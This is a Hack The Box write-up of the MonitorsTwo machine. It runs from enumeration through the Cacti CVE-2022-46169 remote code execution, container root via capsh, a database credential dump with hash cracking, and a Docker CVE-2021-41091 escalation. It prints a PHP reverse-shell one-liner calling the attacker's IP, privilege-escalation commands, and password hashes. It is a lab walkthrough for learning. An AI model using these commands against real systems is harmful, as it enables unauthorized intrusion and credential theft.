
# Learning Objectives Met

- github release enumeration
- vulnerable docker application
- exposed user credentials / weak password



# Enumeration

NMAP enumeration is usually how I begin HTB challenges. The nmap command I start off with is an all port scan to see what is available on my target.

Command: nmap -p- 10.10.11.211 -oN scans/allPorts
Results

```bash
┌──(cal1㉿cal)-[~/htb/monitorstwo]
└─$ nmap -p- 10.10.11.211 -oN scans/allPorts    
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-16 21:09 EDT
Nmap scan report for 10.10.11.211
Host is up (0.048s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 51.27 seconds

```

At this point I have established that the target has an ssh and http server running. Before I begin poking around, I kick off another nmap scan. this time passing the flags -sC and -sV so I get enumerate the services a bit more and also start some common nmap scripts


Command: nmap -p22,80 -sC -sV 10.10.11.211 -oN scans/specificPorts
Results

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.73 seconds
```

>[!tip] Hot info
>Okay so notice that the title says login to cacti. Cacti could be the name of the server, of the application, etc. Smart to store
>that info and perform research later.

When looking at web traffic I usually port all of mines through BurpSuite and this time is no different. I open up firefox, turn on foxyproxy, and pass my traffic through burp. Below we can see the results of me visiting the index page and the information it revealed to me

![[Pasted image 20230816211801.png]]

and I also see
![[Pasted image 20230816211854.png]]

>[!tip] More Info
>We got a version number for CACTi, and we also know that the server is php based. Both two good tidbits of information to have.

Before we dig around some more, I shoot of a gobuster scan. I have extension php based on the information collected above about this server being php based.

Command: gobuster dir -e -u http://10.10.11.211 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/small -x php
Results
![[Pasted image 20230818141108.png]]

While the gobuster was running I tried some basic passwords on the main login page for cacti and that didnt work. Before I got to password bruteforcing, or trying to discover some of the other pages popping up in gobuster, I decided to do some research on Cacti. Luckily enough I found a github page for the application at the following link:

Link: https://github.com/Cacti


From the main github page for cacti, I was able to navigate to the releases page. I wanted to see if there were any vulnerability fixes for the version of cacti I had.

Link: https://github.com/Cacti/cacti/releases

![[Pasted image 20230816213103.png]]

Got lucky and see that version 1.2.23 of cacti fixed the vulnerability above and there is a CVE put out for it. Unauthenticated sounds great considering I didnt have any creds so far. Google Showed me the following links.


Link to CVE: https://github.com/sAsPeCt488/CVE-2022-46169
Link to Blog Describing CVE: https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/




# Initial Shell

So after thoroughly reading about the exploit, I decided to give it a go. First things first was to download a version of the poc on github.
![[Pasted image 20230817082827.png]]

Once I had the CVE downloaded, I spun up a webserver using python, then issued a curl command back to my attack box using the poc.
![[Pasted image 20230817083008.png]]

>[!INFO]
>Note that the above image shows a whoami being passed but we do not see it in the request to our makeshift server. That is because I am lazy and crafted two images together. Trust me bro, it works

Alright so I knew the poc was working, but when I tried to spin up a reverse shell using netcat, I was unsucessful. To get a better idea of what was going under the hood, added some code to the poc that would pass all traffic through burpsuite first. This gave me a more granular look at what exactly was going on.

![[Pasted image 20230817083222.png]]

I figured out by the traffic captured that some of my reverse shell commands were not getting parsed well. In order to fix that I URL encoded everything and also I am now operating from repeater tab in burp suite as well.

Reverse Shell Used
```php
php -r '$sock=fsockopen("10.10.14.5",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Set up netcat listener
![[Pasted image 20230817083318.png]]

Fire Off Round in Burpsuite
![[Pasted image 20230817083414.png]]

>[!tip] Try multiple things
>In the original exploit, the author mentioned using the host IP of the victim machine to bypass the checks implemented. Using 127.0.0.1 worked for me so make sure you play around with more than just one idea.




Got My Initial Callback!
![[Pasted image 20230817083434.png]]


# Post Enumeration

Okay so I immediately start trying to find my way to root. Looking for programs with the setuid bit set showed me a program called capsh that allows a person root access.

SUID Bits
![[Pasted image 20230817084712.png]]

Link: https://gtfobins.github.io/gtfobins/capsh/
Command: $ /sbin/capsh --gid=0 --uid=0 --


Now this did give me root access but there were no root flags or user flags to find. The heck? Kept digging. 
Navigated to root directory and saw a file called entrypoint.sh

Found in /
![[Pasted image 20230818133208.png]]

I see some mysql creds in there so I reissue  the command to gain access to the cacti database. From there I saw a table called "auth_users", saw what columns it had, and pulled out the information I wanted

>[!tip] SCRIPT for the win!
>So before I issued the command to connect to mysql, I wanted an interactive shell. Python was not on the box so I could not get an interactive shell that way. I solved my problem by using script command to get me my shell
>
>script /dev/null -qc /bin/bash


![[Pasted image 20230818133346.png]]

```sql
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+
|  1 | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
|  3 | guest    | 43e9a4ab75570f5b                                             |
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----+----------+--------------------------------------------------------------+

```

Hashes
![[Pasted image 20230818133715.png]]


Cracked Password w John
![[Pasted image 20230818133634.png]]

Logged into marcus account.
![[Pasted image 20230818134323.png]]

Okay so logging into marcus account I was able to see the user.txt flag. But its weird that I didnt see this user before in the /etc/passwd file when I first got my initial shell on box. Whats going on?

I run processes and I see that docker is running!

Processes Running
![[Pasted image 20230818134400.png]]

Docker Running Version
![[Pasted image 20230818134430.png]]

I was more than likely in a docker container which explains why I was not able to see some information. Is there an exploit for this version of docker?

Exploit

Link: https://github.com/UncleJ4ck/CVE-2021-41091

![[Pasted image 20230818134820.png]]

PERFECT

# Gaining Root Shell

Download exploit
![[Pasted image 20230818134932.png]]

Transfer to Victim Machine using scp
![[Pasted image 20230818134955.png]]

On my shell thats inside the docker container I gain root access by taking advantage of the capsh program with the setuid bit set. From there I follow exploit instructions and change permissions on the /bin/bash program.
CHMOD bin/bash
![[Pasted image 20230818135030.png]]

Ran exploit POC on Marcus account
![[Pasted image 20230818135114.png]]


Got Root
![[Pasted image 20230818135145.png]]

And there you have it! A complete guide on how to pwn monitorsTwo for HTB


